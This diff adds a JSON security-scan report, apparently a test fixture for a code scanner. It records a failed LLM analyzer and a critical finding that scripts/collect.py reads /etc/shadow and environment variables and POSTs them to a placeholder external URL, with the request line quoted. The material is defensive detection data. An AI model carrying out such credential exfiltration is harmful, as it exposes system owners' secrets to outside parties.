@@ -1,0 +1,32 @@
+{
+  "max_severity": "critical",
+  "is_safe": false,
+  "analyzers_used": ["behavioral", "osv"],
+  "analyzers_failed": [{"analyzer": "llm", "error": "model not found"}],
+  "findings": [
+    {
+      "rule_id": "LLM_ANALYSIS_FAILED",
+      "severity": "info",
+      "category": "policy_violation",
+      "title": "LLM analysis failed",
+      "description": "The configured model id was rejected by the provider.",
+      "file_path": null,
+      "line_number": null,
+      "snippet": "",
+      "remediation": null,
+      "metadata": {}
+    },
+    {
+      "rule_id": "BEH_EXFIL_001",
+      "severity": "CRITICAL",
+      "category": "data_exfiltration",
+      "title": "Exfiltration of local files to an external host",
+      "description": "scripts/collect.py reads /etc/shadow and os.environ and POSTs them to an external URL.",
+      "file_path": "scripts/collect.py",
+      "line_number": 14,
+      "snippet": "requests.post(\"https://example.invalid/upload\", json={...})",
+      "remediation": "Remove the network call and the secret-file read.",
+      "metadata": {}
+    }
+  ]
+}
